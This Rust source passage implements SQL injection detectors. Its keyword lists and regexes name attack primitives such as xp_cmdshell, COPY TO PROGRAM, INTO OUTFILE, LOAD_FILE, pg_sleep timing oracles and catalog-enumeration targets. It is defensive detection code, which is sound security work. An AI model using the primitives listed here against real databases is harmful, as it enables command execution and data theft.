//! SQL L2 Evaluators — Tautology Detection + Structural Analysis
//!
//! Two evaluators:
//!   1. SqlTautologyEvaluator: boolean expression evaluation (1=1, 'a'='a')
//!   2. SqlStructuralEvaluator: token-sequence analysis for 6 SQL classes
//!
//! Both use the SQL tokenizer for structural detection, not regex.

use crate::evaluators::{EvidenceOperation, L2Detection, L2Evaluator, ProofEvidence};
use crate::tokenizers::sql::{SqlTokenType, SqlTokenizer, detect_tautologies};
use crate::types::InvariantClass;
use regex::Regex;

// ── SQL Tautology Evaluator ─────────────────────────────────────

pub struct SqlTautologyEvaluator;

impl L2Evaluator for SqlTautologyEvaluator {
    fn id(&self) -> &'static str {
        "sql_tautology"
    }
    fn prefix(&self) -> &'static str {
        "L2 SQL Tautology"
    }

    #[inline]

    fn detect(&self, input: &str) -> Vec<L2Detection> {
        let tautologies = detect_tautologies(input);
        tautologies.iter().map(|t| {
            L2Detection {
                detection_type: "tautology".into(),
                confidence: 0.90,
                detail: format!("Tautological expression: {} = {} (evaluates to TRUE)",
                    t.expression, t.value),
                position: t.position,
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: t.expression.clone(),
                    interpretation: "Tautological expression evaluates to TRUE".into(),
                    offset: t.position,
                    property: "Boolean evaluation of SQL conditional expression must not be unconditional TRUE".into(),
                }],
            }
        }).collect()
    }

    fn map_class(&self, detection_type: &str) -> Option<InvariantClass> {
        match detection_type {
            "tautology" => Some(InvariantClass::SqlTautology),
            _ => None,
        }
    }
}

// ── SQL Structural Evaluator ────────────────────────────────────

const SQL_INJECTION_KEYWORDS: &[&str] = &[
    "OR", "AND", "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "EXEC", "EXECUTE",
    "CREATE", "ALTER", "HAVING", "WHERE", "ORDER", "GROUP", "GRANT", "REVOKE", "TRUNCATE",
];

const STATEMENT_STARTERS: &[&str] = &[
    "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "CREATE", "ALTER", "EXEC", "EXECUTE", "GRANT",
    "REVOKE", "TRUNCATE",
];

const TIME_DELAY_FUNCTIONS: &[&str] = &[
    "SLEEP",
    "WAITFOR",
    "PG_SLEEP",
    "DBMS_LOCK.SLEEP",
    "BENCHMARK",
    "DELAY",
    "PG_SLEEP_FOR",
    "PG_SLEEP_UNTIL",
    "DBMS_PIPE.RECEIVE_MESSAGE",
];

const ERROR_FUNCTIONS: &[&str] = &[
    "EXTRACTVALUE",
    "UPDATEXML",
    "XMLTYPE",
    "DBMS_XMLGEN",
    "UTL_INADDR",
    "CTXSYS",
    "GTID_SUBSET",
    "NAME_CONST",
];

const SQL_EXEC_PRIMITIVES: &[&str] = &[
    "XP_CMDSHELL",
    "SP_OACREATE",
    "SP_OAMETHOD",
    "SP_EXECUTESQL",
    "UTL_HTTP.REQUEST",
    "UTL_INADDR.GET_HOST_ADDRESS",
    "LOAD_FILE",
    "PG_READ_FILE",
    "PG_READ_BINARY_FILE",
    "PG_LS_DIR",
];

const SQL_EXFIL_TARGETS: &[&str] = &[
    "INFORMATION_SCHEMA",
    "PG_CATALOG",
    "SQLITE_MASTER",
    "MYSQL.USER",
    "SYS.SQL_LOGINS",
];

const SQL_SENSITIVE_FIELDS: &[&str] = &[
    "PASSWORD",
    "PASSWD",
    "PASS_HASH",
    "SECRET",
    "TOKEN",
    "API_KEY",
    "AUTH",
];

pub struct SqlStructuralEvaluator;

/// Token type aliases that map to our tokenizer's SqlTokenType
type TokTuple = (SqlTokenType, std::string::String, usize);

impl SqlStructuralEvaluator {
    fn detect_obfuscated_union(&self, input: &str) -> Vec<L2Detection> {
        static BLOCK_COMMENT_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?is)/\*.*?\*/").unwrap());

        let without_comments = BLOCK_COMMENT_RE.replace_all(input, "");
        let collapsed: String = without_comments
            .chars()
            .filter(|c| !c.is_whitespace())
            .collect::<String>()
            .to_uppercase();

        let has_union = collapsed.contains("UNIONSELECT") || collapsed.contains("UNIONALLSELECT");
        if !has_union {
            return Vec::new();
        }

        vec![L2Detection {
            detection_type: "union_extraction".into(),
            confidence: 0.91,
            detail: "Obfuscated UNION SELECT pattern recovered after comment/whitespace normalization".into(),
            position: input.to_uppercase().find("UN").unwrap_or(0),
            evidence: vec![ProofEvidence {
                operation: EvidenceOperation::EncodingDecode,
                matched_input: input.to_owned(),
                interpretation: "SQL block comments and whitespace were normalized to reveal UNION SELECT semantics".into(),
                offset: 0,
                property: "Injected SQL payloads must not introduce UNION query execution paths".into(),
            }],
        }]
    }

    fn detect_chr_keyword_construction(&self, input: &str) -> Vec<L2Detection> {
        static CHR_CHAIN_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)(?:(?:chr|char)\s*\(\s*\d{1,3}\s*\)\s*(?:\|\||\+)\s*){3,}(?:chr|char)\s*\(\s*\d{1,3}\s*\)").unwrap()
        });
        static CHR_CALL_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?i)(?:chr|char)\s*\(\s*(\d{1,3})\s*\)").unwrap()
        });
        const SUSPICIOUS: &[&str] = &[
            "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "EXEC", "WAITFOR", "SLEEP",
        ];

        let mut dets = Vec::new();
        for m in CHR_CHAIN_RE.find_iter(input) {
            let snippet = m.as_str();
            let mut out = String::new();

            for caps in CHR_CALL_RE.captures_iter(snippet) {
                let Some(num_match) = caps.get(1) else {
                    continue;
                };
                let Ok(code) = num_match.as_str().parse::<u32>() else {
                    continue;
                };
                let ch = char::from_u32(code).unwrap_or('\0');
                if ch.is_ascii() && !ch.is_ascii_control() {
                    out.push(ch);
                }
            }

            if out.len() < 4 {
                continue;
            }

            let out_upper = out.to_uppercase();
            let has_keyword = SUSPICIOUS.iter().any(|kw| out_upper.contains(kw));
            if !has_keyword {
                continue;
            }

            dets.push(L2Detection {
                detection_type: "union_extraction".into(),
                confidence: 0.90,
                detail: format!("CHR/CHAR concatenation reconstructs SQL keyword sequence: {}", out),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: snippet.to_owned(),
                    interpretation: format!("Input concatenates CHR/CHAR calls to construct SQL payload text: {}", out),
                    offset: m.start(),
                    property: "User input must not construct executable SQL keywords via function-based concatenation".into(),
                }],
            });
        }

        dets
    }

    fn detect_string_termination(&self, input: &str, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();

        // Strategy 1: STRING followed by SQL keyword/operator/boolean
        for i in 0..meaningful.len().saturating_sub(1) {
            let (cur_type, _, cur_pos) = meaningful[i];
            let (next_type, next_val, _) = meaningful[i + 1];

            if *cur_type == SqlTokenType::String {
                let is_injection = matches!(
                    next_type,
                    SqlTokenType::Keyword | SqlTokenType::Operator | SqlTokenType::BooleanOp
                ) || (*next_type == SqlTokenType::Separator && next_val == ";");

                if is_injection {
                    detections.push(L2Detection {
                        detection_type: "string_termination".into(),
                        confidence: 0.75,
                        detail: format!("String literal terminated, followed by SQL {:?}: '{}'",
                            next_type, next_val),
                        position: *cur_pos,
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::PayloadInject,
                            matched_input: extract_context(input, *cur_pos, 60),
                            interpretation: "Input closes an application string context and injects SQL syntax".into(),
                            offset: *cur_pos,
                            property: "String context must remain scoped; user input should not terminate the intended SQL literal".into(),
                        }],
                    });
                }
            }
        }

        // Strategy 2: Injection prefix detection
        let trimmed = input.trim_start();
        if let Some(first_char) = trimmed.chars().next() {
            if first_char == '\'' || first_char == '"' || first_char == '`' {
                let rest = trimmed[first_char.len_utf8()..].trim_start();
                let rest = rest.trim_start_matches(')').trim_start();
                if !rest.is_empty() {
                    let tokenizer = SqlTokenizer;
                    let rest_stream = tokenizer.tokenize(rest);
                    let rest_meaningful: Vec<_> = rest_stream
                        .all()
                        .iter()
                        .filter(|t| t.token_type != SqlTokenType::Whitespace)
                        .collect();

                    if let Some(first) = rest_meaningful.first() {
                        let val_upper = first.value.to_uppercase();
                        let is_injection_kw = matches!(
                            first.token_type,
                            SqlTokenType::Keyword | SqlTokenType::BooleanOp
                        ) || SQL_INJECTION_KEYWORDS
                            .contains(&val_upper.as_str());

                        if is_injection_kw {
                            detections.push(L2Detection {
                                detection_type: "string_termination".into(),
                                confidence: 0.78,
                                detail: format!("Injection prefix: quote terminator followed by {}", first.value),
                                position: 0,
                                evidence: vec![ProofEvidence {
                                    operation: EvidenceOperation::ContextEscape,
                                    matched_input: format!("{}{}", first_char, first.value),
                                    interpretation: "Input closes an application string context and injects SQL syntax".into(),
                                    offset: 0,
                                    property: "String context must remain scoped; user input should not terminate the intended SQL literal".into(),
                                }],
                            });
                        }
                    }
                }
            }
        }

        detections
    }

    fn detect_union_extraction(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();

        for i in 0..meaningful.len() {
            let (tok_type, tok_val, tok_pos) = meaningful[i];
            if *tok_type == SqlTokenType::Keyword && tok_val.eq_ignore_ascii_case("UNION") {
                let mut j = i + 1;
                if j < meaningful.len() && meaningful[j].1.eq_ignore_ascii_case("ALL") {
                    j += 1;
                }
                if j < meaningful.len() && meaningful[j].1.eq_ignore_ascii_case("SELECT") {
                    detections.push(L2Detection {
                        detection_type: "union_extraction".into(),
                        confidence: 0.92,
                        detail: "UNION SELECT detected as SQL keyword tokens (not substring match)".into(),
                        position: *tok_pos,
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::PayloadInject,
                            matched_input: format!("UNION {}SELECT", if j > i + 1 { "ALL " } else { "" }),
                            interpretation: "Input appends UNION SELECT and changes result set scope".into(),
                            offset: *tok_pos,
                            property: "Injected SQL payloads must not introduce UNION query execution paths".into(),
                        }],
                    });
                }
            }
        }
        detections
    }

    fn detect_stacked_execution(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();

        for i in 0..meaningful.len().saturating_sub(1) {
            let (cur_type, cur_val, cur_pos) = meaningful[i];
            // Semicolons are Separator type in our tokenizer
            if *cur_type == SqlTokenType::Separator && cur_val == ";" {
                let (next_type, next_val, _) = meaningful[i + 1];
                let val_upper = next_val.to_uppercase();
                if *next_type == SqlTokenType::Keyword
                    && STATEMENT_STARTERS.contains(&val_upper.as_str())
                {
                    detections.push(L2Detection {
                        detection_type: "stacked_execution".into(),
                        confidence: 0.90,
                        detail: format!("Statement separator (;) followed by {} — stacked query execution", next_val),
                        position: *cur_pos,
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::PayloadInject,
                            matched_input: format!("; {}", next_val),
                            interpretation: "Input terminates one SQL statement and starts another".into(),
                            offset: *cur_pos,
                            property: "SQL statement boundary must remain single-statement unless explicitly intended".into(),
                        }],
                    });
                }
            }
        }
        detections
    }

    fn detect_semicolon_normalized_stacked(&self, input: &str) -> Vec<L2Detection> {
        static BLOCK_COMMENT_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?is)/\*.*?\*/").unwrap());
        static LINE_COMMENT_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| Regex::new(r"(?m)(?:--|#)[^\n]*").unwrap());

        let without_block = BLOCK_COMMENT_RE.replace_all(input, "");
        let without_comments = LINE_COMMENT_RE.replace_all(&without_block, "");
        let collapsed = without_comments
            .chars()
            .filter(|c| !c.is_whitespace())
            .collect::<String>()
            .to_uppercase();

        let stacked_markers = [
            ";SELECT",
            ";INSERT",
            ";UPDATE",
            ";DELETE",
            ";DROP",
            ";CREATE",
            ";ALTER",
            ";EXEC",
            ";EXECUTE",
            ";TRUNCATE",
            ";GRANT",
            ";REVOKE",
        ];

        if let Some(marker) = stacked_markers.iter().find(|marker| collapsed.contains(**marker)) {
            return vec![L2Detection {
                detection_type: "stacked_execution_normalized".into(),
                confidence: 0.92,
                detail: format!(
                    "Stacked SQL statement recovered after whitespace/comment normalization: {}",
                    marker
                ),
                position: input.find(';').unwrap_or(0),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::EncodingDecode,
                    matched_input: input.to_owned(),
                    interpretation:
                        "Comment and whitespace normalization reveals semicolon-delimited stacked SQL execution"
                            .into(),
                    offset: input.find(';').unwrap_or(0),
                    property:
                        "SQL input must not contain normalized semicolon-separated multi-statement payloads"
                            .into(),
                }],
            }];
        }

        Vec::new()
    }

    fn detect_mysql_if_sleep_subquery(&self, input: &str) -> Vec<L2Detection> {
        static MYSQL_IF_SLEEP_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(
                r"(?is)\bif\s*\(\s*\d+\s*=\s*\d+\s*,\s*sleep\s*\(\s*\d+(?:\.\d+)?\s*\)\s*,\s*0\s*\)",
            )
            .unwrap()
        });

        let mut detections = Vec::new();
        for m in MYSQL_IF_SLEEP_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "mysql_if_sleep_time_oracle".into(),
                confidence: 0.93,
                detail: "MySQL IF(condition,SLEEP(),0) subquery timing payload".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Conditional MySQL IF() call executes SLEEP() to leak truth values via response time"
                            .into(),
                    offset: m.start(),
                    property:
                        "User input must not introduce conditional SQL time-delay branches".into(),
                }],
            });
        }

        detections
    }

    fn detect_postgres_cast_pg_sleep_chain(&self, input: &str) -> Vec<L2Detection> {
        static PG_CAST_SLEEP_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(
                r"(?is)\b\d+\s*::\s*int\s*=\s*\d+\s+and\s*\(\s*select\s+pg_sleep\s*\(\s*\d+(?:\.\d+)?\s*\)\s*\)\s+is\s+not\s+null",
            )
            .unwrap()
        });

        let mut detections = Vec::new();
        for m in PG_CAST_SLEEP_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "postgres_cast_pg_sleep_oracle".into(),
                confidence: 0.92,
                detail: "PostgreSQL cast + pg_sleep boolean-chain payload".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "PostgreSQL cast/boolean chain with subquery pg_sleep() indicates advanced blind/error-oracle probing"
                            .into(),
                    offset: m.start(),
                    property:
                        "User input must not compose cast-based boolean chains with timing subqueries"
                            .into(),
                }],
            });
        }

        detections
    }

    fn detect_mysql_select_if_sleep_subquery(&self, input: &str) -> Vec<L2Detection> {
        static MYSQL_SELECT_IF_SLEEP_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| {
                Regex::new(
                    r"(?is)\(\s*select\s+if\s*\(\s*1\s*=\s*1\s*,\s*sleep\s*\(\s*\d+(?:\.\d+)?\s*\)\s*,\s*0\s*\)\s*\)",
                )
                .unwrap()
            });

        let mut detections = Vec::new();
        for m in MYSQL_SELECT_IF_SLEEP_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "mysql_select_if_sleep_subquery".into(),
                confidence: 0.94,
                detail: "MySQL SELECT IF(1=1,SLEEP(...),0) timing subquery payload".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::PayloadInject,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Nested SELECT IF(...,SLEEP(),0) expression leaks boolean state via timing side-channel"
                            .into(),
                    offset: m.start(),
                    property:
                        "User input must not introduce nested MySQL conditional timing subqueries".into(),
                }],
            });
        }
        detections
    }

    fn detect_semicolon_whitespace_stacked_variant(&self, input: &str) -> Vec<L2Detection> {
        static SEMICOLON_WS_STACKED_RE: std::sync::LazyLock<Regex> =
            std::sync::LazyLock::new(|| {
                Regex::new(
                    r"(?is);\s*(?:/\*.*?\*/\s*|--[^\n]*\n\s*|#[^\n]*\n\s*)*(?:select|insert|update|delete|drop|alter|create|exec(?:ute)?)\b",
                )
                .unwrap()
            });
        let mut detections = Vec::new();
        for m in SEMICOLON_WS_STACKED_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "stacked_execution_semicolon_ws".into(),
                confidence: 0.91,
                detail: "Semicolon-stacked query with whitespace/comment padding".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::EncodingDecode,
                    matched_input: m.as_str().to_owned(),
                    interpretation:
                        "Semicolon-delimited statement boundary survives whitespace/comment obfuscation"
                            .into(),
                    offset: m.start(),
                    property:
                        "SQL inputs must reject semicolon-separated statement chaining even when comment-padded"
                            .into(),
                }],
            });
        }
        detections
    }

    fn detect_time_oracle(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();

        for i in 0..meaningful.len() {
            let (tok_type, tok_val, tok_pos) = meaningful[i];
            let val_upper = tok_val.to_uppercase();

            if matches!(tok_type, SqlTokenType::Identifier | SqlTokenType::Keyword)
                && TIME_DELAY_FUNCTIONS.contains(&val_upper.as_str())
                && i + 1 < meaningful.len()
                && meaningful[i + 1].0 == SqlTokenType::ParenOpen
            {
                detections.push(L2Detection {
                    detection_type: "time_oracle".into(),
                    confidence: 0.90,
                    detail: format!("Time-delay function call: {}()", tok_val),
                    position: *tok_pos,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: format!("{}(", tok_val),
                        interpretation: "Input reaches a SQL timing function for delay-based logic".into(),
                        offset: *tok_pos,
                        property: "Execution time of SQL evaluation must remain independent of attacker-controlled timing".into(),
                    }],
                });
            }

            // WAITFOR DELAY (T-SQL)
            if matches!(tok_type, SqlTokenType::Keyword | SqlTokenType::Identifier)
                && val_upper == "WAITFOR"
                && i + 1 < meaningful.len()
                && meaningful[i + 1].1.eq_ignore_ascii_case("DELAY")
            {
                detections.push(L2Detection {
                    detection_type: "time_oracle".into(),
                    confidence: 0.92,
                    detail: "WAITFOR DELAY — time-based blind SQL injection".into(),
                    position: *tok_pos,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: "WAITFOR DELAY".into(),
                        interpretation: "Input reaches a SQL timing function for delay-based logic".into(),
                        offset: *tok_pos,
                        property: "Execution time of SQL evaluation must remain independent of attacker-controlled timing".into(),
                    }],
                });
            }

            // BENCHMARK with large count
            if matches!(tok_type, SqlTokenType::Identifier | SqlTokenType::Keyword)
                && val_upper == "BENCHMARK"
                && i + 2 < meaningful.len()
                && meaningful[i + 1].0 == SqlTokenType::ParenOpen
                && meaningful[i + 2].0 == SqlTokenType::Number
            {
                if let Ok(val) = meaningful[i + 2].1.parse::<f64>() {
                    if val > 100000.0 {
                        detections.push(L2Detection {
                            detection_type: "time_oracle".into(),
                            confidence: 0.92,
                            detail: format!("BENCHMARK with high iteration count: {}", val),
                            position: *tok_pos,
                            evidence: vec![ProofEvidence {
                                operation: EvidenceOperation::PayloadInject,
                                matched_input: format!("BENCHMARK({}...", val),
                                interpretation: "Input reaches a SQL timing function for delay-based logic".into(),
                                offset: *tok_pos,
                                property: "Execution time of SQL evaluation must remain independent of attacker-controlled timing".into(),
                            }],
                        });
                    }
                }
            }
        }
        detections
    }

    fn detect_error_oracle(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();

        for i in 0..meaningful.len() {
            let (tok_type, tok_val, tok_pos) = meaningful[i];
            let val_upper = tok_val.to_uppercase();

            if matches!(tok_type, SqlTokenType::Identifier | SqlTokenType::Keyword)
                && ERROR_FUNCTIONS.contains(&val_upper.as_str())
                && i + 1 < meaningful.len()
                && meaningful[i + 1].0 == SqlTokenType::ParenOpen
            {
                let mut depth = 0i32;
                let mut has_subquery = false;
                for j in (i + 1)..meaningful.len() {
                    if meaningful[j].0 == SqlTokenType::ParenOpen {
                        depth += 1;
                    }
                    if meaningful[j].0 == SqlTokenType::ParenClose {
                        depth -= 1;
                    }
                    if meaningful[j].0 == SqlTokenType::Keyword
                        && meaningful[j].1.eq_ignore_ascii_case("SELECT")
                    {
                        has_subquery = true;
                    }
                    if depth == 0 {
                        break;
                    }
                }

                detections.push(L2Detection {
                    detection_type: "error_oracle".into(),
                    confidence: if has_subquery { 0.92 } else { 0.80 },
                    detail: format!("Error-based extraction function: {}(){}",
                        tok_val, if has_subquery { " with embedded SELECT" } else { "" }),
                    position: *tok_pos,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: format!("{}(", tok_val),
                        interpretation: "Input reaches an SQL function used to trigger verbose database errors".into(),
                        offset: *tok_pos,
                        property: "SQL evaluation must not execute attacker-controlled error-reflection functions".into(),
                    }],
                });
            }
        }
        detections
    }

    fn detect_comment_truncation(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();

        for i in 0..meaningful.len() {
            let (tok_type, tok_val, tok_pos) = meaningful[i];

            // Comments come through as Separator with value starting with -- or #
            let is_comment = *tok_type == SqlTokenType::Separator
                && (tok_val.starts_with("--") || tok_val == "#");

            if !is_comment {
                continue;
            }

            let has_prior_injection = meaningful[..i].iter().any(|(t, v, _)| {
                let v_upper = v.to_uppercase();
                (*t == SqlTokenType::BooleanOp && (v_upper == "OR" || v_upper == "AND"))
                    || (*t == SqlTokenType::Keyword
                        && STATEMENT_STARTERS.contains(&v_upper.as_str()))
                    || (*t == SqlTokenType::Keyword && v_upper == "UNION")
                    || (*t == SqlTokenType::Keyword && v_upper == "HAVING")
                    || (*t == SqlTokenType::Keyword && v_upper == "ORDER")
            });

            if has_prior_injection {
                let comment_preview = if tok_val.len() > 2 {
                    &tok_val[..2]
                } else {
                    tok_val.as_str()
                };
                detections.push(L2Detection {
                    detection_type: "comment_truncation".into(),
                    confidence: 0.82,
                    detail: format!(
                        "SQL comment ({}) after injection context — truncates remaining query",
                        comment_preview
                    ),
                    position: *tok_pos,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::SyntaxRepair,
                        matched_input: tok_val.clone(),
                        interpretation:
                            "Input injects comment syntax to truncate remaining SQL statement"
                                .into(),
                        offset: *tok_pos,
                        property:
                            "Injected SQL comments must not truncate application query semantics"
                                .into(),
                    }],
                });
            }
        }
        detections
    }

    fn detect_file_exec_primitives(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();

        for i in 0..meaningful.len() {
            let (tok_type, tok_val, tok_pos) = meaningful[i];
            let val_upper = tok_val.to_uppercase();
            if !matches!(tok_type, SqlTokenType::Identifier | SqlTokenType::Keyword) {
                continue;
            }

            if SQL_EXEC_PRIMITIVES.contains(&val_upper.as_str())
                && i + 1 < meaningful.len()
                && meaningful[i + 1].0 == SqlTokenType::ParenOpen
            {
                detections.push(L2Detection {
                    detection_type: "file_exec_primitive".into(),
                    confidence: 0.93,
                    detail: format!("Dangerous SQL execution/file primitive: {}()", tok_val),
                    position: *tok_pos,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: format!("{}(", tok_val),
                        interpretation: "Input reaches SQL primitives commonly used for OS execution or filesystem access".into(),
                        offset: *tok_pos,
                        property: "User input must not invoke SQL primitives that can execute commands or read/write files".into(),
                    }],
                });
            }

            if val_upper == "COPY" {
                let lookahead = &meaningful[i + 1..meaningful.len().min(i + 14)];
                let has_to = lookahead
                    .iter()
                    .any(|(_, v, _)| v.eq_ignore_ascii_case("TO"));
                let has_program = lookahead
                    .iter()
                    .any(|(_, v, _)| v.eq_ignore_ascii_case("PROGRAM"));
                if has_to && has_program {
                    detections.push(L2Detection {
                        detection_type: "file_exec_primitive".into(),
                        confidence: 0.95,
                        detail: "PostgreSQL COPY ... TO PROGRAM primitive detected".into(),
                        position: *tok_pos,
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::PayloadInject,
                            matched_input: "COPY ... TO PROGRAM".into(),
                            interpretation: "Input introduces COPY TO PROGRAM execution path".into(),
                            offset: *tok_pos,
                            property: "User input must not introduce SQL COPY PROGRAM execution primitives".into(),
                        }],
                    });
                }
            }

            if val_upper == "INTO" && i + 1 < meaningful.len() {
                let next = meaningful[i + 1].1.to_uppercase();
                if next == "OUTFILE" || next == "DUMPFILE" {
                    detections.push(L2Detection {
                        detection_type: "file_exec_primitive".into(),
                        confidence: 0.93,
                        detail: format!("MySQL file-write primitive detected: INTO {}", next),
                        position: *tok_pos,
                        evidence: vec![ProofEvidence {
                            operation: EvidenceOperation::PayloadInject,
                            matched_input: format!("INTO {}", next),
                            interpretation: "Input introduces SQL file-write primitive".into(),
                            offset: *tok_pos,
                            property:
                                "User input must not introduce SQL filesystem write primitives"
                                    .into(),
                        }],
                    });
                }
            }
        }

        detections
    }

    fn detect_catalog_exfiltration(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();

        let has_select = meaningful.iter().any(|(t, v, _)| {
            *t == SqlTokenType::Keyword
                && (v.eq_ignore_ascii_case("SELECT") || v.eq_ignore_ascii_case("UNION"))
        });
        if !has_select {
            return detections;
        }

        let union_present = meaningful
            .iter()
            .any(|(t, v, _)| *t == SqlTokenType::Keyword && v.eq_ignore_ascii_case("UNION"));

        for (tok_type, tok_val, tok_pos) in meaningful {
            if !matches!(tok_type, SqlTokenType::Identifier | SqlTokenType::Keyword) {
                continue;
            }
            let val_upper = tok_val.to_uppercase();
            if SQL_EXFIL_TARGETS.iter().any(|t| val_upper.contains(t)) {
                detections.push(L2Detection {
                    detection_type: "catalog_exfiltration".into(),
                    confidence: if union_present { 0.91 } else { 0.85 },
                    detail: format!("System catalog target in query path: {}", tok_val),
                    position: *tok_pos,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: tok_val.clone(),
                        interpretation: "Input targets system metadata catalogs commonly used for staged SQL exfiltration".into(),
                        offset: *tok_pos,
                        property: "User input must not introduce system catalog enumeration paths in SQL queries".into(),
                    }],
                });
            }
        }

        detections
    }

    fn detect_case_time_oracle(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        let meaningful: Vec<_> = tokens
            .iter()
            .filter(|(t, _, _)| *t != SqlTokenType::Whitespace)
            .collect();

        for i in 0..meaningful.len() {
            let (tok_type, tok_val, tok_pos) = meaningful[i];
            if *tok_type != SqlTokenType::Keyword || !tok_val.eq_ignore_ascii_case("CASE") {
                continue;
            }

            let mut has_when = false;
            let mut has_time = false;
            for (inner_type, inner_val, _) in &meaningful[i + 1..] {
                if *inner_type == SqlTokenType::Keyword && inner_val.eq_ignore_ascii_case("WHEN") {
                    has_when = true;
                }
                if matches!(inner_type, SqlTokenType::Identifier | SqlTokenType::Keyword)
                    && TIME_DELAY_FUNCTIONS.contains(&inner_val.to_uppercase().as_str())
                {
                    has_time = true;
                }
                if *inner_type == SqlTokenType::Keyword && inner_val.eq_ignore_ascii_case("END") {
                    break;
                }
            }

            if has_when && has_time {
                detections.push(L2Detection {
                    detection_type: "case_time_oracle".into(),
                    confidence: 0.91,
                    detail:
                        "CASE/WHEN conditional with timing primitive indicates blind SQL oracle"
                            .into(),
                    position: *tok_pos,
                    evidence: vec![ProofEvidence {
                        operation: EvidenceOperation::PayloadInject,
                        matched_input: "CASE ... WHEN ... <time_fn>() ... END".into(),
                        interpretation:
                            "Input creates a conditional timing side-channel in SQL execution"
                                .into(),
                        offset: *tok_pos,
                        property:
                            "SQL conditionals must not expose attacker-controlled timing oracles"
                                .into(),
                    }],
                });
            }
        }

        detections
    }

    fn detect_scientific_union_bypass(&self, input: &str) -> Vec<L2Detection> {
        static SCI_UNION_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
            Regex::new(r"(?is)\b\d+(?:\.\d+)?e[+\-]?\d+(?:/\*.*?\*/|\s)*union(?:/\*.*?\*/|\s)*(?:all(?:/\*.*?\*/|\s)*)?select\b").unwrap()
        });

        let mut detections = Vec::new();
        for m in SCI_UNION_RE.find_iter(input) {
            detections.push(L2Detection {
                detection_type: "scientific_union".into(),
                confidence: 0.91,
                detail: "Scientific-notation numeric literal fused with UNION SELECT keyword sequence".into(),
                position: m.start(),
                evidence: vec![ProofEvidence {
                    operation: EvidenceOperation::TypeCoerce,
                    matched_input: m.as_str().to_owned(),
                    interpretation: "Input abuses numeric exponent parsing to smuggle UNION SELECT without a delimiter".into(),
                    offset: m.start(),
                    property: "Injected SQL payloads must not introduce UNION query execution paths".into(),
                }],
            });
        }
        detections
    }

    fn detect_hex_encoded_keywords(&self, tokens: &[TokTuple]) -> Vec<L2Detection> {
        let mut detections = Vec::new();
        for (tok_type, tok_val, tok_pos) in tokens {
            if *tok_type != SqlTokenType::Number {
                continue;
            }
